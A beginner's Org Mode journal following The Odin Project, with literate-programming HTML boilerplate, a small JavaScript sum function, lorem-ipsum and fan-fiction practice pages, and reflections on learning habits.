Gonna follow this one---and *not* derail!
Need to feel secure about this.
But have to be careful about rabbit holes.

Personally, I tend to try to become a "specialist" on every detail.
Many times I don't get past the first stages of the learning process.
Journaling helps me a lot here.

Just opened a new issue on Odin's page.
I want to start collaborating.
It's a really easy one, but it's a start.

Just found out I goofed-up: the /real/ issue was my eagerness...
The issue is non-existant: I misread the text...
Well, one good opportunity to learn about this current personality trait!

Fitst session of the day ended.
Could finish all the initial readings and setup stuff.

Next: HTML!

** Odin recommended a site that has some JS.
Let's see if I remember it.
It's the code to sum two numbers.
It's a bit more complicated, because involves accessing the DOM.
Let's simplify it.
Just sum the contents of two variables, and assign it to another variable.

#+begin_src js
function sum (a, b) {
    let total = a + b;
    return total;
}
#+end_src

#+begin_quote
function NAME (ARGS) { STATEMENT; ... }
#+end_quote

And it returns with =return=.

Node.js is used to run JS in the server.

HTML: the page has *content*, which is enclosed in *tags*, forming *elements*.

An HTML tag is the markup language entity used to define elements with the content that will be shown on the page.

The element has
1. Opening tag;
2. Content;
3. Closing tag.


Void elements
- Don't have a closing tag; and
- Have no content.


We're coding, baby!

[[file:html-boilerplate/index.html][html-boilerplate/index.html]] ≡

#+begin_src html :tangle html-boilerplate/index.html
<!DOCTYPE html>
<html lang="en">
  <<head Block>>

  <<body Block>>
</html>
#+end_src

The =head= contains metadata and rendering instructions.
*No page content* here.
Always the first element inside =<html>=.

~<head Block> +≡~

#+begin_src html :noweb-ref head Block
<head>
  <<charset>>
  <<title>>
</head>
#+end_src

Let's make sure all glyphs show correctly.

~<<charset>> +≡~

#+begin_src html :noweb-ref charset
<meta charset="UTF-8">
#+end_src

Now the title.

~<<title>> +≡~

#+begin_src html :noweb-ref title
<title>My first page from Odin</title>
#+end_src

~<<body Block>> +≡~

#+begin_src html :noweb-ref body Block
<body>
  <<body Contents>>
</body>
#+end_src

Now add this to Emacs =web-mode=.

#+begin_src elisp
(add-to-list 'web-mode-snippets
               '("my-odin-html-boilerplate"
                 "<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>My first page from Odin</title>
  </head>

  <body>
  </body>
</html>
"))
#+end_src

~<<body Contents>> +≡~

#+begin_src html :noweb-ref body Contents
<h1>Hello, World!</h1>
#+end_src

And W3 validate, baby!

I did some coding in HTML, and some debugging in Emacs.  Either Org or =noweb= were misbehaving.
Didn't know which though---I just restarted Emacs, and everything went back to normal.
Could apply the steps recommended by Odin for analyzing the problem, and it helped.

** 1h Coding, Hello World, HTML Boilerplate
:PROPERTIES:
:header-args: :session hello world
:END:
End of the day, after busking.
Kinda desperate that I didn't code today's 1h.
But there's plenty of time.
Thought of doing some elisp, but wanna focus on JS.

Let's try Exercism.
Can't really do the exercises without knowing the language, and don't think grinding on Exercism is a good use of my time.

Gonna go back to Odin, even if it is more /theory/ now.
There's hopefully some coding even now in the beginning.
If not, I'll reserve some time later and code elisp.

** Working with Text
*** Create a blog post
#+begin_quote
Create a plain blog article page which uses different headings, uses paragraphs, and has some text in the paragraphs bolded and italicized.
You can use Lorem Ipsum to generate dummy text, in place of real text as you build your sites.
#+end_quote

[[file:odin/assignments/foundations/working-with-text/index.html][odin/assignments/foundations/working-with-text/index.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/working-with-text/blog-post.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Lorem ipsum</title>
  </head>

  <body>
    <h1>Phasellus neque orci, porta a, aliquet quis, semper a, massa</h1>
    <p>Aliquam erat volutpat.  Nunc eleifend <em>leo vitae magna</em>.  In id erat non orci commodo lobortis.  Proin neque massa, cursus ut, gravida ut, lobortis eget, lacus.  Sed diam.  Praesent fermentum tempor tellus.  Nullam tempus.  Mauris ac felis vel velit tristique imperdiet.  Donec at <strong>peed</strong>.  Etiam vel neque nec dui dignissim bibendum.  Vivamus id enim.  Phasellus neque orci, porta a, aliquet quis, semper a, massa.  Phasellus purus.  Pellentesque tristique imperdiet tortor.  Nam euismod <strong>tellus id erat</strong>.</p>

    <h2>Donec hendrerit tempor tellus</h2>
    <p>Pellentesque dapibus suscipit ligula.  Donec posuere augue in quam.  Etiam vel tortor sodales tellus ultricies commodo.  Suspendisse potenti.  Aenean in sem ac leo mollis blandit.  Donec neque quam, dignissim in, mollis nec, sagittis eu, wisi.  Phasellus lacus.  Etiam laoreet quam sed arcu.  Phasellus at dui in ligula mollis ultricies.  Integer placerat tristique nisl.  Praesent augue.  Fusce commodo.  Vestibulum convallis, lorem a tempus semper, dui dui euismod elit, vitae placerat urna tortor vitae lacus.  Nullam libero mauris, consequat quis, varius et, dictum id, arcu.  Mauris mollis tincidunt felis.  Aliquam feugiat tellus ut neque.  Nulla facilisis, risus a rhoncus fermentum, tellus tellus lacinia purus, et dictum nunc justo sit amet elit.</p>

    <h3>Aliquam posuere</h3>
    <p>Nullam eu ante vel est convallis dignissim.  Fusce suscipit, wisi nec facilisis facilisis, est dui fermentum leo, quis tempor ligula erat quis odio.  Nunc porta vulputate tellus.  Nunc rutrum turpis sed pede.  Sed bibendum.  Aliquam posuere.  Nunc aliquet, augue nec adipiscing interdum, lacus tellus malesuada massa, quis varius mi purus non odio.  Pellentesque condimentum, magna ut suscipit hendrerit, ipsum augue ornare nulla, non luctus diam neque sit amet urna.  Curabitur vulputate vestibulum lorem.  Fusce sagittis, libero non molestie mollis, magna orci ultrices dolor, at vulputate neque nulla lacinia eros.  Sed id ligula quis est convallis tempor.  Curabitur lacinia pulvinar nibh.  Nam a sapien.</p>

    <h3>Fusce suscipit, wisi nec facilisis facilisis, est dui fermentum leo, quis tempor ligula erat quis odio</h3>
    <p>Pellentesque dapibus suscipit ligula.  Donec posuere augue in quam.  Etiam vel tortor sodales tellus ultricies commodo.  Suspendisse potenti.  Aenean in sem ac leo mollis blandit.  Donec neque quam, dignissim in, mollis nec, sagittis eu, wisi.  Phasellus lacus.  Etiam laoreet quam sed arcu.  Phasellus at dui in ligula mollis ultricies.  Integer placerat tristique nisl.  Praesent augue.  Fusce commodo.  Vestibulum convallis, lorem a tempus semper, dui dui euismod elit, vitae placerat urna tortor vitae lacus.  Nullam libero mauris, consequat quis, varius et, dictum id, arcu.  Mauris mollis tincidunt felis.  Aliquam feugiat tellus ut neque.  Nulla facilisis, risus a rhoncus fermentum, tellus tellus lacinia purus, et dictum nunc justo sit amet elit.</p>

    <h2>Mauris mollis tincidunt felis</h2>
    <p>Nullam eu ante vel est convallis dignissim.  Fusce suscipit, wisi nec facilisis facilisis, est dui fermentum leo, quis tempor ligula erat quis odio.  Nunc porta vulputate tellus.  Nunc rutrum turpis sed pede.  Sed bibendum.  Aliquam posuere.  Nunc aliquet, augue nec adipiscing interdum, lacus tellus malesuada massa, quis varius mi purus non odio.  Pellentesque condimentum, magna ut suscipit hendrerit, ipsum augue ornare nulla, non luctus diam neque sit amet urna.  Curabitur vulputate vestibulum lorem.  Fusce sagittis, libero non molestie mollis, magna orci ultrices dolor, at vulputate neque nulla lacinia eros.  Sed id ligula quis est convallis tempor.  Curabitur lacinia pulvinar nibh.  Nam a sapien.</p>

    <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  Donec hendrerit tempor tellus.  Donec pretium posuere tellus.  Proin quam nisl, tincidunt et, mattis eget, convallis nec, purus.  Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.  Nulla posuere.  Donec vitae dolor.  Nullam tristique diam non turpis.  Cras placerat accumsan nulla.  Nullam rutrum.  Nam vestibulum accumsan nisl.</p>

    <h3>Lorem ipsum dolor sit amet, consectetuer adipiscing eli</h3>
    <p>Pellentesque dapibus suscipit ligula.  Donec posuere augue in quam.  Etiam vel tortor sodales tellus ultricies commodo.  Suspendisse potenti.  Aenean in sem ac leo mollis blandit.  Donec neque quam, dignissim in, mollis nec, sagittis eu, wisi.  Phasellus lacus.  Etiam laoreet quam sed arcu.  Phasellus at dui in ligula mollis ultricies.  Integer placerat tristique nisl.  Praesent augue.  Fusce commodo.  Vestibulum convallis, lorem a tempus semper, dui dui euismod elit, vitae placerat urna tortor vitae lacus.  Nullam libero mauris, consequat quis, varius et, dictum id, arcu.  Mauris mollis tincidunt felis.  Aliquam feugiat tellus ut neque.  Nulla facilisis, risus a rhoncus fermentum, tellus tellus lacinia purus, et dictum nunc justo sit amet elit.</p>

    <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  Donec hendrerit tempor tellus.  Donec pretium posuere tellus.  Proin quam nisl, tincidunt et, mattis eget, convallis nec, purus.  Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.  Nulla posuere.  Donec vitae dolor.  Nullam tristique diam non turpis.  Cras placerat accumsan nulla.  Nullam rutrum.  Nam vestibulum accumsan nisl.</p>

    <p>Pellentesque dapibus suscipit ligula.  Donec posuere augue in quam.  Etiam vel tortor sodales tellus ultricies commodo.  Suspendisse potenti.  Aenean in sem ac leo mollis blandit.  Donec neque quam, dignissim in, mollis nec, sagittis eu, wisi.  Phasellus lacus.  Etiam laoreet quam sed arcu.  Phasellus at dui in ligula mollis ultricies.  Integer placerat tristique nisl.  Praesent augue.  Fusce commodo.  Vestibulum convallis, lorem a tempus semper, dui dui euismod elit, vitae placerat urna tortor vitae lacus.  Nullam libero mauris, consequat quis, varius et, dictum id, arcu.  Mauris mollis tincidunt felis.  Aliquam feugiat tellus ut neque.  Nulla facilisis, risus a rhoncus fermentum, tellus tellus lacinia purus, et dictum nunc justo sit amet elit.</p>
  </body>
</html>

#+end_src

** First Seinfeld checkmark!
And this coding session warranted me my first one Seinfeld checkmark!

[[file:images/2025-09-26_seinfeld_checked.jpeg]]

* [2025-09-24 Wed]
So, we're learning Web Dev.
Well, at least /I/ am!

Let's make it easier and more fun with Literate Programming in Org Mode.

Starting from the fundamentals.
Web pages are all about navigating through content.
To make things easier, we have:
- HTML, for /structure/;
- CSS, for /style/;
- Javascript, for /logic/.


A minimal html page [[https://html.spec.whatwg.org/multipage/syntax.html?utm_source=chatgpt.com#writing][must have]]:

#+begin_src html
<!DOCTYPE html>
<html>
</html>
#+end_src

Here:
- ~<!DOCTYPE html>~ is the /Document Type Declaration/; it tells the browser the specifications that the page follows.
- ~<html>~ and ~</html>~ enclose the page itself.

The fundamental element of a web page is... well, an =element=.
By definition, an =element= is composed by (example inside the parentheses):
- opening tag (~<html>~);
- everything in between (called /content/);
- closing tag (~</html>~).

The page is made of a /sequence of elements/.

Some elements may be /empty/: they don't have a closing tag.
Example: ~<!DOCTYPE html>~.

A /cool/ first web page would be:

[[file:hello-world.html][hello-world.html]] ≡

#+begin_src html :tangle hello-world.html
<!DOCTYPE html>
<html>
  <p>Hello, World!</p>
</html>
#+end_src

*NOTE:* Here the /contents/ of the =element= ~<p>~ are "Hello, world!".

The ~<html>~ element contains all the elements of the whole page.
Only two tags should be immediately inside it: ~<head>~ and ~<body>~.
~<head>~ contains /metadata/; more about this below.
~<body>~ contains all the /visible/ elements of the page.

Then, each element of the page is either inside ~<head>~ or ~<body>~.
This is illustrated below.

#+begin_src
<html>
|
+- <head>
|
+- <body>
#+end_src

To help make things more clear, we'll call
- /Document/: the elements ~<!DOCTYPE>~ and ~<head>~ together, and
- /Page/: the ~<body>~ element.


For instance: ~hello-world.html~ contains the whole /document/.
When we open it on a browser, we see the (obviously /visible/) /page/, which is inside ~<body>~.

Let's then fix our first page!
It had a ~<p>~ element immediately inside ~<html>~, which is against the specs.
It must be inside ~<body>~.

We also have to add a ~<head>~ inside ~<html>~.
We could leave it empty, but that's not cool.
We'll put a ~<title>~ inside it.
~<title>~ is the /page/ title, that appears as the "name" of the browser window or the page's tab in the browser.

[[file:hello-world-fixed.html][hello-world-fixed.html]] ≡

#+begin_src html :tangle hello-world-fixed.html
<!DOCTYPE html>
<html>
  <head>
    <title>My first fixed page</title>
  </head>
  <body>
    <p>Hello, World!</p>
  </body>
</html>
#+end_src

If you open both ~hello-world.html~ and ~hello-world-fixed.html~, you'll see that they look the same.
This shows how /forgiving/ HTML is.
It really tries to help us get there.
Good on you, HTML!

To help organizing paragraphs, we have /headings/.
They give us /six/ of them: ~<h1>~ to ~<h6>~.

[[file:headings.html][headings.html]] ≡

#+begin_src html :tangle headings.html
<!DOCTYPE html>
<html>
  <head>
    <title>Guess who my favorite was?</title>
  </head>
  <body>
    <h1>S.H.I.E.L.D. Team</h1>
    <h2>Nick Fury</h2>
    <p>Leading S.H.I.E.L.D. with an iron will and one eye on the bigger picture. He always anticipates threats before they happen. His presence commands respect across the superhero community. Nothing slips past his watchful eye.</p>

    <h2>Phil Coulson</h2>
    <p>The calm in the storm, proving loyalty is a superpower. Coulson bridges heroes and humans with tact and understanding. He carries a quiet strength that inspires trust. Even in chaos, his steady hand guides the team.</p>

    <h2>Maria Hill</h2>
    <p>Strategic, precise, and always ready for action. Hill can handle the toughest missions with clarity and focus. Her decisiveness keeps S.H.I.E.L.D. running smoothly. She never hesitates when lives are on the line.</p>

    <h2>Melinda May</h2>
    <p>The Cavalry—silent, deadly, and unstoppable. May’s combat skills are unmatched in the field. Beneath her stoic exterior lies fierce loyalty to her team. Every mission she undertakes is executed with perfection.</p>

    <h2>Leopold Fitz</h2>
    <p>Brains behind the tech, making the impossible possible. Fitz’s inventions often turn the tide in dire situations. His curiosity drives constant innovation. Even under pressure, his intellect shines brilliantly.</p>

    <h2>Skye</h2>
    <h3>Hacker</h3>
    <p>Skye starts out as a brilliant hacker, using her skills to uncover secrets and fight for justice from the shadows. Her curiosity and determination make her a force to be reckoned with. Even before joining S.H.I.E.L.D., she proves she can challenge the system.</p>

    <h3>Agent</h3>
    <p>Joining S.H.I.E.L.D., Skye becomes a trained field agent, learning to balance her intellect with physical skill. She adapts quickly to missions, proving her value to the team. Her loyalty and resourcefulness grow stronger with every challenge.</p>

    <h3>Daughter</h3>
    <p>Skye discovers her true identity as Daisy Johnson, the daughter of a powerful Inhuman. This revelation reshapes her understanding of herself and her powers. She struggles but ultimately embraces her heritage, gaining confidence and purpose.</p>

    <h3>Leader</h3>
    <p>Over time, Skye evolves into a capable leader, guiding missions and protecting her team. Her experience as both an outsider and a hero gives her unique insight. She inspires others through courage, empathy, and decisiveness.</p>

    <h3>Quake</h3>
    <p>Fully embracing her abilities, Skye becomes Quake, wielding seismic powers to combat threats. She balances heroism with personal growth, using her strength to defend the world. Quake is the culmination of her journey, symbolizing resilience, power, and identity.</p>
  </body>
</html>
#+end_src

Interesting to note that the paragraphs inside a heading are *not* nested inside it.

Now comes the ~<br>~ element.
It forces a line break in the text.
It is an /empty/ element, meaning it has no content.
This implies it does *not* need nor have an end tag.

In the example below, the poem has two versions: in the first one, the line breaks are only in the source code, and the second version /forces/ them with ~<br>~.
Only the second one gets the expected result (well, at least on a big screen).

[[file:br.html][br.html]] ≡

#+begin_src html :tangle br.html
<!DOCTYPE html>
<html>
  <head>
    <title>br, but not for Brazil</title>
  </head>
  <body>
    <p>He-Man stands tall, sword held high,
      Shadows flee where his heroes fly.
      In Eternia’s heart, he lights the night,
      Strength and courage his endless might.</p>

    <p>He-Man stands tall, sword held high,<br>
      Shadows flee where his heroes fly.<br>
      In Eternia’s heart, he lights the night,<br>
      Strength and courage his endless might.</p>
  </body>
</html>
#+end_src

Now is a good time to note that the tag names are case-insensitive.
Very sensible of forgiving HTML.
But (there's always one (well, not /always/)) *lowercase is recommended* in general and *demanded* for stricter document types like XHTML.
Let's keep it down low then.
